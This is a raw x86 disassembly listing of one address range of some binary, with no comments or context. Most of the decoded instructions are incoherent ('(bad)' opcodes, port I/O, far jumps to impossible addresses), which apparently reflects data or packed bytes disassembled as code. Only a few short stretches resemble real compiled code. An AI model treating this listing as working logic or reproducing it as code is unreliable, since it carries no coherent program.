  40c8c8:	add    eax,ebx
  40c8ca:	xchg   esp,eax
  40c8cb:	add    ebp,0x11
  40c8ce:	sahf   
  40c8cf:	mov    ebp,0x30c6890b
  40c8d4:	push   DWORD PTR [esi-0x67]
  40c8d7:	fidiv  WORD PTR [ebx]
  40c8d9:	jo     0x40c8fd
  40c8db:	add    eax,0xd2ba5671
  40c8e0:	icebp  
  40c8e1:	adc    DWORD PTR [ecx-0x5c101898],eax
  40c8e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8e9:	and    eax,0xfbd6032
  40c8ee:	dec    edx
  40c8ef:	pop    ebx
  40c8f0:	add    ecx,DWORD PTR [edi]
  40c8f2:	fwait
  40c8f3:	in     al,dx
  40c8f4:	(bad)  
  40c8f5:	cmp    al,0x40
  40c8f7:	daa    
  40c8f8:	out    0xfd,al
  40c8fa:	icebp  
  40c8fb:	lahf   
  40c8fc:	pusha  
  40c8fd:	bound  esi,QWORD PTR [ebp-0x336ba049]
  40c903:	lods   eax,DWORD PTR ds:[esi]
  40c904:	add    esp,DWORD PTR [edx]
  40c906:	cwde   
  40c907:	ss (bad) 
  40c90a:	mov    bl,0x46
  40c90c:	lahf   
  40c90d:	cmp    eax,0xe1214e30
  40c912:	ins    BYTE PTR es:[edi],dx
  40c913:	(bad)  [ebx]
  40c915:	cli    
  40c916:	and    BYTE PTR ds:0xa733f95e,0xb9
  40c91d:	dec    edx
  40c91e:	pop    edi
  40c91f:	nop
  40c920:	fdivr  DWORD PTR [esi]
  40c922:	jge    0x40c8af
  40c924:	retf   
  40c925:	dec    edi
  40c926:	pop    edi
  40c927:	mov    ecx,DWORD PTR [ebp-0x14]
  40c92a:	mov    cl,BYTE PTR [eax+ecx*1]
  40c92d:	mov    eax,DWORD PTR [ebp-0x34]
  40c930:	or     BYTE PTR [eax],cl
  40c932:	mov    eax,DWORD PTR [ebp+0x10]
  40c935:	mov    ecx,eax
  40c937:	jmp    0x40cec1
  40c93c:	and    DWORD PTR [edx],ebp
  40c93e:	sbb    cl,BYTE PTR ds:0x1a21fd20
  40c944:	in     al,dx
  40c945:	and    al,0xf9
  40c947:	push   0x68e2dfe8
  40c94c:	jae    0x40c918
  40c94e:	push   ss
  40c94f:	push   ss
  40c950:	cmp    eax,0x8a161604
  40c955:	ds xchg edx,eax
  40c957:	adc    al,0xe1
  40c959:	dec    esp
  40c95a:	cdq    
  40c95b:	ins    BYTE PTR es:[edi],dx
  40c95c:	iret   
  40c95d:	cwde   
  40c95e:	fsubr  QWORD PTR [edx-0x57cfa847]
  40c964:	jp     0x40c8fc
  40c966:	sub    dh,BYTE PTR [esi-0x7c]
  40c969:	add    dh,BYTE PTR [ebx-0x7d]
  40c96c:	scas   al,BYTE PTR es:[edi]
  40c96d:	mov    dh,BYTE PTR [ecx-0x1df7c89b]
  40c973:	adc    edx,ebp
  40c975:	mov    ebp,0x3035d52a
  40c97a:	pop    ecx
  40c97b:	imul   eax,DWORD PTR [edx+0x12],0x1
  40c97f:	xor    al,0xb
  40c981:	fwait
  40c982:	jl     0x40c99f
  40c984:	sti    
  40c985:	fdivr  QWORD PTR ds:0xe97e0c6d
  40c98b:	add    eax,0xe31f39fd
  40c990:	rcr    DWORD PTR [ecx-0x38],0xe4
  40c994:	xor    ecx,DWORD PTR [ecx+ecx*8-0x35]
  40c998:	mov    al,0x46
  40c99a:	popa   
  40c99b:	push   ds
  40c99c:	add    BYTE PTR [ebx-0x1480b8c4],bl
  40c9a2:	sub    bl,dl
  40c9a4:	mov    ch,0xb3
  40c9a6:	mov    ?,WORD PTR [ecx]
  40c9a8:	call   0xdfeee012
  40c9ad:	test   eax,0xfedfb1f1
  40c9b2:	sbb    ah,BYTE PTR [ecx-0x4b07d330]
  40c9b8:	dec    esp
  40c9b9:	loopne 0x40c95f
  40c9bb:	enter  0x4dc6,0xc0
  40c9bf:	jno    0x40c988
  40c9c1:	cmc    
  40c9c2:	(bad)  
  40c9c3:	xor    al,0xa3
  40c9c5:	fs sub al,0x59
  40c9c8:	test   eax,0xc701dcd7
  40c9cd:	push   esi
  40c9ce:	push   ebp
  40c9cf:	out    0x92,eax
  40c9d1:	sbb    al,0xf2
  40c9d3:	out    dx,al
  40c9d4:	xchg   esp,eax
  40c9d5:	push   cs
  40c9d6:	push   DWORD PTR [edx]
  40c9d8:	jbe    0x40c98e
  40c9da:	xor    DWORD PTR [esp+eax*8+0xe6df7aa],0x3d
  40c9e2:	lea    ebp,[ebp+0x78]
  40c9e5:	sub    al,0xb2
  40c9e7:	xor    edx,DWORD PTR [edx+0x71]
  40c9ea:	and    BYTE PTR [ebx],al
  40c9ec:	pop    ecx
  40c9ed:	pop    es
  40c9ee:	cmc    
  40c9ef:	sbb    al,0xb4
  40c9f1:	mov    bl,0xb7
  40c9f3:	inc    ecx
  40c9f4:	and    BYTE PTR [edx-0x6660d3e2],cl
  40c9fa:	iret   
  40c9fb:	dec    eax
  40c9fc:	jno    0x40ca62
  40c9fe:	mov    eax,0x701f636c
  40ca03:	jg     0x40ca30
  40ca05:	jo     0x40ca72
  40ca07:	sahf   
  40ca08:	in     eax,0xc
  40ca0a:	cmc    
  40ca0b:	mov    ds:0xaa2d7007,al
  40ca10:	mov    edi,0x631d0524
  40ca15:	(bad)  
  40ca17:	and    al,0x24
  40ca19:	lods   eax,DWORD PTR ds:[esi]
  40ca1a:	jg     0x40ca23
  40ca1c:	jge    0x40ca02
  40ca1e:	out    0xdd,al
  40ca20:	cmp    al,0x8c
  40ca22:	push   ebp
  40ca23:	xor    BYTE PTR [edi+ecx*2+0x7c],bl
  40ca27:	inc    esi
  40ca28:	xchg   ebp,eax
  40ca29:	stc    
  40ca2a:	sbb    dl,dh
  40ca2c:	call   0xf8a8a5aa
  40ca31:	jno    0x40ca4e
  40ca33:	in     eax,0x1c
  40ca35:	std    
  40ca36:	in     eax,0x19
  40ca38:	push   ecx
  40ca39:	(bad)  
  40ca3a:	jbe    0x40ca69
  40ca3c:	dec    ebp
  40ca3d:	inc    edx
  40ca3e:	sbb    al,0x9a
  40ca40:	cmp    bl,BYTE PTR [ecx-0x54]
  40ca43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca44:	sub    ebx,ecx
  40ca46:	test   DWORD PTR [ecx-0x7285f03d],esi
  40ca4c:	jmp    0xa3f9:0x3a26a1bb
  40ca53:	pushf  
  40ca54:	and    DWORD PTR [eax+0x589c6c45],edi
  40ca5a:	xlat   BYTE PTR ds:[ebx]
  40ca5b:	out    dx,eax
  40ca5c:	cmp    bh,0xeb
  40ca5f:	sbb    BYTE PTR [ebx+0x3ff838ae],ah
  40ca65:	or     esi,DWORD PTR [ebx]
  40ca67:	lock jmp 0xca02af3b
  40ca6d:	(bad)  
  40ca6e:	repz test DWORD PTR [edi+0x70a73375],0x5a72879e
  40ca79:	pop    eax
  40ca7a:	cmp    al,0xef
  40ca7c:	xchg   esp,eax
  40ca7d:	(bad)  
  40ca7f:	mov    cl,0x1f
  40ca81:	pop    eax
  40ca82:	dec    eax
  40ca83:	add    al,0xec
  40ca85:	cmovno esp,esp
  40ca88:	mov    BYTE PTR [edi-0x29],ah
  40ca8b:	push   ds
  40ca8c:	and    al,0x85
  40ca8e:	fwait
  40ca8f:	xor    BYTE PTR [eax-0x74],bh
  40ca92:	sbb    cl,BYTE PTR [edx-0x75eae256]
  40ca98:	nop
  40ca99:	mov    BYTE PTR [edi],dl
  40ca9b:	sub    ebp,DWORD PTR [edi]
  40ca9d:	add    DWORD PTR [ebx+0x18339bbf],eax
  40caa3:	sub    BYTE PTR [eax],ah
  40caa5:	ficomp WORD PTR es:[eax-0x4d]
  40caa9:	xchg   ebp,eax
  40caaa:	and    ch,BYTE PTR [eax+0x53c6a261]
  40cab0:	mov    bh,dl
  40cab2:	mov    edi,0x2d35b7fb
  40cab7:	push   ds
  40cab8:	and    al,0x99
  40caba:	(bad)  
  40cabc:	fdiv   st,st(2)
  40cabe:	adc    DWORD PTR [ebx+esi*2],edi
  40cac1:	arpl   WORD PTR [esi+0x29bed234],bx
  40cac7:	xchg   ebp,esi
  40cac9:	mov    ch,0xfc
  40cacb:	shl    BYTE PTR [ebp+0x7d],0x12
  40cacf:	out    0x7,eax
  40cad1:	ret    0x1bfd
  40cad4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cad5:	xor    eax,0xde78ce1f
  40cada:	mov    bl,0xc7
  40cadc:	stos   DWORD PTR es:[edi],eax
  40cadd:	xor    cl,0xb2
  40cae0:	shr    DWORD PTR ds:0xe937ed25,0xd5
  40cae7:	push   esi
  40cae8:	xor    eax,DWORD PTR [edi+0x51]
  40caeb:	icebp  
  40caec:	setb   BYTE PTR [edx]
  40caef:	test   eax,0x56a25705
  40caf4:	mov    ebx,0xd4355643
  40caf9:	mov    BYTE PTR [ebp-0x1b4692e5],bl
  40caff:	shl    ecx,1
  40cb01:	test   BYTE PTR [ebx],bh
  40cb03:	or     DWORD PTR [edx+0x6b],ebx
  40cb06:	iret   
  40cb07:	mov    dl,0x38
  40cb09:	dec    eax
  40cb0a:	dec    esp
  40cb0b:	(bad)  
  40cb0c:	and    al,0x22
  40cb0e:	(bad)  
  40cb0f:	int3   
  40cb10:	inc    BYTE PTR [eax+edx*4-0x20c9d05c]
  40cb17:	sub    al,0x78
  40cb19:	mov    WORD PTR fs:[ebx+eax*1+0x1aac67c5],gs
  40cb21:	lods   al,BYTE PTR ds:[esi]
  40cb22:	iret   
  40cb23:	popa   
  40cb24:	out    0xe4,eax
  40cb26:	fs push ebp
  40cb28:	push   eax
  40cb29:	pop    ss
  40cb2a:	lahf   
  40cb2b:	add    esp,ecx
  40cb2d:	into   
  40cb2e:	bsf    ebp,DWORD PTR [ebp-0x17]
  40cb32:	out    0x82,eax
  40cb34:	cmp    edi,DWORD PTR [ebp+0x6c]
  40cb37:	pop    eax
  40cb38:	div    DWORD PTR [ebp+0x75a0df6d]
  40cb3e:	mov    WORD PTR [edi+0x42],fs
  40cb41:	xchg   ebx,eax
  40cb42:	dec    eax
  40cb43:	xlat   BYTE PTR ds:[ebx]
  40cb44:	xor    ecx,esi
  40cb46:	push   ds
  40cb47:	hlt    
  40cb48:	int    0xa9
  40cb4a:	sbb    eax,0x2f6fd28f
  40cb4f:	sbb    cl,BYTE PTR [ebx-0x4]
  40cb52:	sbb    al,0x4e
  40cb54:	sub    dh,BYTE PTR [edx-0x69]
  40cb57:	inc    ebp
  40cb58:	xchg   esi,eax
  40cb59:	idiv   DWORD PTR [esi]
  40cb5b:	and    eax,0x503072cc
  40cb60:	call   DWORD PTR [ebp-0x536f4d64]
  40cb66:	cmp    al,0x4b
  40cb68:	scas   eax,DWORD PTR es:[edi]
  40cb69:	dec    esp
  40cb6a:	pop    ss
  40cb6b:	mov    edx,0x30827f1b
  40cb70:	jmp    0xf7c4:0xb348c0b6
  40cb77:	bound  edi,QWORD PTR [eax-0x5e0de80c]
  40cb7d:	cmc    
  40cb7e:	mov    ebp,0x9fe1a75
  40cb83:	(bad)  
  40cb85:	sbb    BYTE PTR [ecx-0x3b],bl
  40cb88:	cmp    ah,bh
  40cb8a:	pop    edx
  40cb8b:	dec    ebx
  40cb8c:	loop   0x40cb45
  40cb8e:	int3   
  40cb8f:	iret   
  40cb90:	xchg   esi,eax
  40cb91:	test   eax,0xa8c13897
  40cb96:	pop    edi
  40cb97:	outs   dx,BYTE PTR ds:[esi]
  40cb98:	pop    eax
  40cb99:	lods   al,BYTE PTR ds:[esi]
  40cb9a:	out    0xb1,al
  40cb9c:	pop    esi
  40cb9d:	push   ebp
  40cb9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb9f:	shr    BYTE PTR [eax+0x1b],0xef
  40cba3:	fwait
  40cba4:	jle    0x40cb48
  40cba6:	pusha  
  40cba7:	cmp    edi,DWORD PTR [ecx+0x29]
  40cbaa:	stos   DWORD PTR es:[edi],eax
  40cbab:	or     al,0x9c
  40cbad:	stos   BYTE PTR es:[edi],al
  40cbae:	imul   edi,DWORD PTR [eax],0xcd45e36a
  40cbb4:	popf   
  40cbb5:	xor    al,0x1e
  40cbb7:	scas   eax,DWORD PTR es:[edi]
  40cbb8:	dec    edi
  40cbb9:	sub    DWORD PTR [edx+0x4d],ebp
  40cbbc:	push   ebp
  40cbbd:	mov    ah,0x95
  40cbbf:	inc    BYTE PTR [eax-0x74]
  40cbc2:	adc    eax,0x22456dce
  40cbc7:	push   ecx
  40cbc8:	pop    ebx
  40cbc9:	push   cs
  40cbca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbcb:	or     edx,DWORD PTR [esi-0x48ee764d]
  40cbd1:	push   esp
  40cbd2:	in     al,dx
  40cbd3:	mov    bh,BYTE PTR [edx]
  40cbd5:	lds    ecx,FWORD PTR [eax+0x67]
  40cbd8:	in     al,dx
  40cbd9:	add    ch,dh
  40cbdb:	fldln2 
  40cbdd:	stos   DWORD PTR es:[edi],eax
  40cbde:	sbb    DWORD PTR [ecx-0x3ceb0b7d],edx
  40cbe4:	xchg   esp,eax
  40cbe5:	neg    DWORD PTR [ecx+0x47cbb78d]
  40cbeb:	inc    ebp
  40cbec:	aad    0xb9
  40cbee:	or     ebx,DWORD PTR [ebx+0x16]
  40cbf1:	cmp    DWORD PTR [ebp-0x335f5976],0x4c63ab0c
  40cbfb:	pop    ebp
  40cbfc:	push   ecx
  40cbfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbfe:	push   es
  40cbff:	push   esi
  40cc00:	cli    
  40cc01:	mov    bh,bl
  40cc03:	cwde   
  40cc04:	ds dec edi
  40cc06:	dec    ecx
  40cc07:	inc    eax
  40cc08:	jb     0x40cb8c
  40cc0a:	jle    0x40cc65
  40cc0c:	mov    bh,0x32
  40cc0e:	out    dx,eax
  40cc0f:	pop    ds
  40cc10:	aaa    
  40cc11:	dec    ecx
  40cc12:	ja     0x40cc44
  40cc14:	pop    es
  40cc15:	(bad)  
  40cc16:	mov    dh,0xa8
  40cc18:	stos   BYTE PTR es:[edi],al
  40cc19:	mov    ebx,0x11d21725
  40cc1e:	lahf   
  40cc1f:	fnstsw WORD PTR [ebp-0x43d50ce1]
  40cc25:	dec    eax
  40cc26:	mov    esp,0x965a4ee
  40cc2b:	in     al,0xe4
  40cc2d:	sub    dh,BYTE PTR [edi]
  40cc2f:	pusha  
  40cc30:	or     DWORD PTR [esi],edx
  40cc32:	stc    
  40cc33:	push   0xffffffac
  40cc35:	xor    BYTE PTR [esi],bh
  40cc37:	bound  esi,QWORD PTR [esp+esi*2]
  40cc3a:	jae    0x40cc8e
  40cc3c:	sbb    DWORD PTR [esi+0x77ecf17e],ebx
  40cc42:	sti    
  40cc43:	push   ss
  40cc44:	stos   BYTE PTR es:[edi],al
  40cc45:	outs   dx,BYTE PTR ds:[esi]
  40cc46:	pop    ss
  40cc47:	adc    bl,0xe9
  40cc4a:	retf   
  40cc4b:	les    esi,FWORD PTR [esi+0x7d]
  40cc4e:	pop    es
  40cc4f:	cwde   
  40cc50:	and    dh,ah
  40cc52:	pop    esp
  40cc53:	jmp    0xca544631
  40cc58:	pop    edx
  40cc59:	xor    al,0x87
  40cc5b:	je     0x40cc0e
  40cc5d:	push   ds
  40cc5e:	jb     0x40cc98
  40cc60:	stc    
  40cc61:	adc    edi,DWORD PTR es:[ebp-0x49]
  40cc65:	xor    esi,DWORD PTR [esi]
  40cc67:	and    al,0x91
  40cc69:	mov    esp,esi
  40cc6b:	jne    0x48e254ca
  40cc71:	add    al,0x60
  40cc73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc74:	cld    
  40cc75:	int3   
  40cc76:	xchg   bp,ax
  40cc78:	in     ax,dx
  40cc7a:	cmc    
  40cc7b:	add    DWORD PTR [esi+0x2e],eax
  40cc7e:	ret    0x3b0c
  40cc81:	sub    ah,bl
  40cc83:	push   ecx
  40cc84:	adc    BYTE PTR [eax+0x505a3b5e],0xc0
  40cc8b:	pop    eax
  40cc8c:	xchg   edi,eax
  40cc8d:	add    bh,BYTE PTR [ebx]
  40cc8f:	test   al,0xad
  40cc91:	jl     0x40cca4
  40cc93:	loope  0x40cc86
  40cc95:	repz sub edi,ebp
  40cc98:	aaa    
  40cc99:	cld    
  40cc9a:	pop    esi
  40cc9b:	out    dx,eax
  40cc9c:	adc    dh,BYTE PTR ds:0x2a9fa898
  40cca2:	and    esp,ebx
  40cca4:	push   0xffffffa5
  40cca6:	push   0x5b
  40cca8:	fsub   QWORD PTR [ebx-0x4d]
  40ccab:	popa   
  40ccac:	ins    DWORD PTR es:[edi],dx
  40ccad:	pop    ebx
  40ccae:	sahf   
  40ccaf:	push   0xc99e423b
  40ccb4:	sub    edi,eax
  40ccb6:	jge    0x40cc42
  40ccb8:	div    BYTE PTR [ebx-0x1]
  40ccbb:	sbb    edx,DWORD PTR [esi+0x28dfcc52]
  40ccc1:	cmp    BYTE PTR [esi],bh
  40ccc3:	pusha  
  40ccc4:	into   
  40ccc5:	or     edx,0x6db2e6ed
  40cccb:	and    bh,cl
  40cccd:	mov    ds:0x43a12537,eax
  40ccd2:	mov    al,ds:0x65633512
  40ccd7:	test   DWORD PTR [ecx+0x188ddda5],0x7a61120e
  40cce1:	mov    ebx,0x87fd8ba6
  40cce6:	pushf  
  40cce7:	aad    0x78
  40cce9:	stos   BYTE PTR es:[edi],al
  40ccea:	mov    dl,0x5b
  40ccec:	mov    al,0x3a
  40ccee:	adc    al,0x60
  40ccf0:	mov    esp,0xd5f5a481
  40ccf5:	pop    ebp
  40ccf6:	sbb    edi,DWORD PTR [esi+0x19]
  40ccf9:	add    dl,dl
  40ccfb:	ret    0x9fec
  40ccfe:	add    al,al
  40cd00:	shld   DWORD PTR [esi+edx*1-0x6822090a],edi,cl
  40cd08:	jmp    0x4fd9:0x2def873
  40cd0f:	arpl   WORD PTR [edx+0x43f33d79],cx
  40cd15:	and    cl,BYTE PTR ds:0xf5367ba6
  40cd1b:	mov    cl,BYTE PTR [eax-0x2bdba68a]
  40cd21:	xchg   edi,eax
  40cd22:	mov    dh,0x2d
  40cd24:	mov    cl,0xe8
  40cd26:	imul   esi,DWORD PTR [edx],0xa59f46f7
  40cd2c:	in     eax,0xf
  40cd2e:	pop    edx
  40cd2f:	mov    cl,0xf
  40cd31:	bound  ecx,QWORD PTR [ebp-0x37db771]
  40cd37:	fist   WORD PTR [esi+0x2b]
  40cd3a:	push   0x4b
  40cd3c:	lods   al,BYTE PTR ds:[esi]
  40cd3d:	mov    cl,0xe9
  40cd3f:	arpl   WORD PTR [eax],dx
  40cd41:	fnsave [edx]
  40cd43:	jae    0x40cd56
  40cd45:	jne    0x40cd62
  40cd47:	fadd   QWORD PTR [edi+0x12c3af94]
  40cd4d:	cmp    BYTE PTR [esi+0x544ff5d7],0xe4
  40cd54:	push   0x518562e6
  40cd59:	rcl    BYTE PTR [edx-0x5103d6be],1
  40cd5f:	cli    
  40cd60:	ins    DWORD PTR es:[edi],dx
  40cd61:	int3   
  40cd62:	outs   dx,DWORD PTR ds:[esi]
  40cd63:	into   
  40cd64:	sub    ch,BYTE PTR [ebx+0x4c]
  40cd67:	out    0xc6,al
  40cd69:	pop    esp
  40cd6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd6b:	inc    edi
  40cd6c:	mov    al,0x11
  40cd6e:	or     DWORD PTR [esp+ebp*8+0x2acd6280],0x2bbe0bd9
  40cd79:	out    dx,eax
  40cd7a:	cmp    eax,DWORD PTR [ecx-0x11]
  40cd7d:	xchg   BYTE PTR [esi],bh
  40cd7f:	cs xor esi,0xffffffa9
  40cd83:	es aas 
  40cd85:	cld    
  40cd86:	add    eax,0x287b4057
  40cd8b:	stc    
  40cd8c:	mov    eax,ds:0xc0e891
  40cd91:	pop    es
  40cd92:	les    edx,FWORD PTR [ebx]
  40cd94:	cmp    BYTE PTR [eax+0x52e2fcaa],dh
  40cd9a:	imul   esp,DWORD PTR [ecx+0x31],0xf03f2bf8
  40cda1:	lods   al,BYTE PTR ds:[esi]
  40cda2:	pop    ds
  40cda3:	mov    bl,0xff
  40cda5:	call   0x3cabe069
  40cdaa:	retf   
  40cdab:	popa   
  40cdac:	dec    ebp
  40cdad:	adc    eax,DWORD PTR [ebx+0x39]
  40cdb0:	mov    WORD PTR [edi+0x7de8307b],cs
  40cdb6:	adc    al,0x55
  40cdb8:	fdivr  DWORD PTR [edi+0x5c]
  40cdbb:	out    dx,eax
  40cdbc:	add    eax,0xa0219a21
  40cdc1:	in     al,dx
  40cdc2:	outs   dx,DWORD PTR ds:[esi]
  40cdc3:	xor    DWORD PTR [edx*4+0x7253d1b3],0xffffffae
  40cdcb:	mov    al,0x5f
  40cdcd:	and    ch,BYTE PTR [ebx-0xc]
  40cdd0:	jae    0x40ce41
  40cdd2:	mov    eax,ds:0x16553ffd
  40cdd7:	int3   
  40cdd8:	das    
  40cdd9:	cmp    DWORD PTR [edi],esi
  40cddb:	sbb    edi,DWORD PTR [ebx]
  40cddd:	or     DWORD PTR [ebx-0x7f],edi
  40cde0:	adc    BYTE PTR [ebx+0x19],bh
  40cde3:	shl    DWORD PTR [ecx],1
  40cde5:	test   al,0x3f
  40cde7:	xlat   BYTE PTR ss:[ebx]
  40cde9:	imul   ebp,DWORD PTR [ebx+0x47],0x606d58a9
  40cdf0:	cli    
  40cdf1:	ins    BYTE PTR es:[edi],dx
  40cdf2:	mov    edi,0x4164f053
  40cdf7:	pop    ebp
  40cdf8:	dec    ebp
  40cdf9:	fwait
  40cdfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdfb:	mov    ebp,0x47d98f80
  40ce00:	mov    cl,0x69
  40ce02:	mov    ds:0x9b38164a,eax
  40ce07:	xchg   edi,eax
  40ce08:	rol    BYTE PTR [ecx-0x31],cl
  40ce0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce0c:	les    ecx,FWORD PTR [ebp+0x1e]
  40ce0f:	or     al,BYTE PTR [ecx-0x400af876]
  40ce15:	push   esp
  40ce16:	cmc    
  40ce17:	xchg   ax,ax
  40ce19:	xchg   ecx,eax
  40ce1a:	mov    ah,ch
  40ce1c:	shl    bl,cl
  40ce1e:	mov    edi,edi
  40ce20:	adc    DWORD PTR [ebp+0x1c1d3eaa],ebp
  40ce26:	dec    edx
  40ce27:	pop    edx
  40ce28:	mov    bl,0xba
  40ce2a:	cld    
  40ce2b:	pop    ecx
  40ce2c:	add    BYTE PTR [esi],dh
  40ce2e:	ss idiv esp
  40ce31:	push   esi
  40ce32:	fidiv  DWORD PTR [edi-0x51b8f5f]
  40ce38:	cwde   
  40ce39:	dec    ecx
  40ce3a:	jbe    0x40cdee
  40ce3c:	lds    ecx,FWORD PTR [ecx]
  40ce3e:	adc    al,0xfd
  40ce40:	inc    edx
  40ce41:	or     dh,bh
  40ce43:	fadd   st,st(2)
  40ce45:	or     ebp,eax
  40ce47:	jnp    0x40cdfb
  40ce49:	mov    al,ds:0x92fb3e44
  40ce4e:	pop    ebp
  40ce4f:	icebp  
  40ce50:	xchg   ebp,eax
  40ce51:	out    dx,al
  40ce52:	jp     0x40ce14
  40ce54:	ja     0x40cea8
  40ce56:	adc    eax,0xdee9bf6a
  40ce5b:	lods   al,BYTE PTR ds:[esi]
  40ce5c:	cld    
  40ce5d:	pusha  
  40ce5e:	sbb    al,0x8c
  40ce60:	in     al,dx
  40ce61:	loopne 0x40ce0e
  40ce63:	xchg   BYTE PTR ds:0x2acc9e28,dl
  40ce69:	ss (bad) 
  40ce6b:	das    
  40ce6c:	test   BYTE PTR [edx+0x9],0x16
  40ce70:	stos   BYTE PTR es:[edi],al
  40ce71:	xchg   edx,eax
  40ce72:	cdq    
  40ce73:	dec    edi
  40ce74:	and    ebp,edx
  40ce76:	lahf   
  40ce77:	shl    BYTE PTR [eax-0x46],cl
  40ce7a:	cmc    
  40ce7b:	cmp    ecx,DWORD PTR [eax+0x1ade25ff]
  40ce81:	mov    ds:0x16573f8f,eax
  40ce86:	xor    ebp,DWORD PTR [edi-0x22]
  40ce89:	mov    DWORD PTR [eax],esp
  40ce8b:	or     DWORD PTR [edx],ebp
  40ce8d:	enter  0xec14,0x71
  40ce91:	push   esi
  40ce92:	cld    
  40ce93:	push   edi
  40ce94:	imul   BYTE PTR ds:[edi+0x317e95d7]
  40ce9b:	push   cs
  40ce9c:	pop    edx
  40ce9d:	sbb    eax,0x6a144275
  40cea2:	jecxz  0x40cf07
  40cea4:	pop    edx
  40cea5:	std    
  40cea6:	xchg   edx,eax
  40cea7:	jge    0x40cebd
  40cea9:	outs   dx,DWORD PTR ds:[esi]
  40ceaa:	popf   
  40ceab:	cdq    
  40ceac:	or     BYTE PTR [esp+esi*1+0x22efd1bc],cl
  40ceb3:	dec    ebx
  40ceb4:	(bad)  [edi+edi*2+0x5dfa47f2]
  40cebb:	mov    DWORD PTR [esi+0x7c2c2efa],ebx
  40cec1:	shrd   ecx,edx,0x2
  40cec5:	shl    eax,0x1e
  40cec8:	shr    edx,0x2
  40cecb:	mov    DWORD PTR [ebp+0x14],edx
  40cece:	mov    DWORD PTR [ebp+0x14],eax
  40ced1:	xor    edx,edx
  40ced3:	mov    eax,ecx
  40ced5:	xor    eax,edi
  40ced7:	or     eax,edx
  40ced9:	mov    edx,DWORD PTR [ebp-0x4]
  40cedc:	jmp    0x40d466
  40cee1:	lock jae 0x40cef2
  40cee4:	mov    ebp,0x13994155
  40cee9:	enter  0x8c7b,0x6e
  40ceed:	xchg   esi,eax
  40ceee:	cld    
  40ceef:	mov    ?,WORD PTR [edx+0x1616c8a8]
  40cef5:	cmp    eax,0xd8161604
  40cefa:	pushf  
  40cefb:	and    ah,bh
  40cefd:	shl    DWORD PTR [ebp+0x6f],cl
  40cf00:	push   edi
  40cf01:	in     eax,dx
  40cf02:	mov    dl,BYTE PTR [ebx-0x55]
  40cf05:	lods   al,BYTE PTR ds:[esi]
  40cf06:	in     eax,dx
  40cf07:	stos   DWORD PTR es:[edi],eax
  40cf08:	ret    0x30d2
  40cf0b:	loope  0x40cf0c
  40cf0d:	ficom  WORD PTR [eax+eax*8+0x22]
  40cf11:	leave  
  40cf12:	(bad)  
  40cf13:	and    bl,BYTE PTR [edi+0x65]
  40cf16:	sub    esi,esp
  40cf18:	dec    edi
  40cf19:	dec    ecx
  40cf1a:	and    BYTE PTR [ecx],al
  40cf1c:	rcr    ebp,cl
  40cf1e:	adc    DWORD PTR [ecx+0x7f],edi
  40cf21:	arpl   WORD PTR [ebp+edx*2+0x5b],si
  40cf25:	ds mov ecx,0xf3b7a0f0
  40cf2b:	popf   
  40cf2c:	cwde   
  40cf2d:	inc    ecx
  40cf2e:	(bad)  
  40cf30:	jnp    0x40cf06
  40cf32:	mov    al,0x77
  40cf34:	test   eax,0x5e6733c8
  40cf39:	adc    DWORD PTR [ecx+0x7c],esp
  40cf3c:	mov    ebp,DWORD PTR [edx-0x79]
  40cf3f:	rol    DWORD PTR [esi-0xf],cl
  40cf42:	sub    ch,BYTE PTR [edi-0x1d]
  40cf45:	or     ecx,0xffffffad
  40cf48:	nop
  40cf49:	inc    ecx
  40cf4a:	xlat   BYTE PTR ds:[ebx]
  40cf4b:	(bad)  
  40cf4d:	test   esp,edx
  40cf4f:	(bad)  
  40cf50:	aas    
  40cf51:	and    dl,BYTE PTR [edi-0xd]
  40cf54:	xor    bh,bl
  40cf56:	es inc edi
  40cf58:	call   0xb4ab:0xe39c4aaa
  40cf5f:	lea    esp,[ebp+edi*8-0x37]
  40cf63:	(bad)  
  40cf65:	retf   
  40cf66:	mov    esp,0x66004ff2
  40cf6b:	mov    eax,ds:0xda56d740
  40cf70:	xchg   ecx,eax
  40cf71:	inc    ebp
  40cf72:	adc    DWORD PTR [edi+0x25],esi
  40cf75:	xchg   edx,eax
  40cf76:	out    dx,al
  40cf77:	arpl   WORD PTR [ecx-0x4c19f1e4],di
  40cf7d:	popf   
  40cf7e:	(bad)  
  40cf7f:	jo     0x40cf64
  40cf81:	cwde   
  40cf82:	pop    ebp
  40cf83:	test   esi,esp
  40cf85:	xor    esi,DWORD PTR [edx]
  40cf87:	inc    edi
  40cf88:	mov    cl,0xf8
  40cf8a:	dec    ebx
  40cf8b:	or     bl,cl
  40cf8d:	or     eax,0x3b964238
  40cf92:	jmp    0xe49c5caf
  40cf97:	in     eax,0xe
  40cf99:	scas   eax,DWORD PTR es:[edi]
  40cf9a:	out    0x9e,al
  40cf9c:	xchg   ebp,eax
  40cf9d:	sbb    DWORD PTR [ecx-0x77],0x39
  40cfa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfa2:	mov    al,0x8b
  40cfa4:	push   ebp
  40cfa5:	packsswb mm6,mm3
  40cfa8:	iret   
  40cfa9:	xchg   ebx,eax
  40cfaa:	pop    ss
  40cfab:	xor    eax,0xc2501550
  40cfb0:	aam    0xc2
  40cfb2:	ret    0x37b4
  40cfb5:	adc    eax,esp
  40cfb7:	inc    ebp
  40cfb8:	dec    ebp
  40cfb9:	add    esp,ebp
  40cfbb:	inc    ebp
  40cfbc:	icebp  
  40cfbd:	pop    es
  40cfbe:	pop    ebx
  40cfbf:	adc    BYTE PTR [ebx],bl
  40cfc1:	xchg   DWORD PTR [ebp+0xc],ecx
  40cfc4:	pop    edx
  40cfc5:	mov    cl,0xf
  40cfc7:	arpl   WORD PTR [ebx-0x2bffb080],dx
  40cfcd:	cmp    BYTE PTR [ecx],bl
  40cfcf:	adc    al,0x9e
  40cfd1:	ror    DWORD PTR [esi+ebx*1-0x5a],1
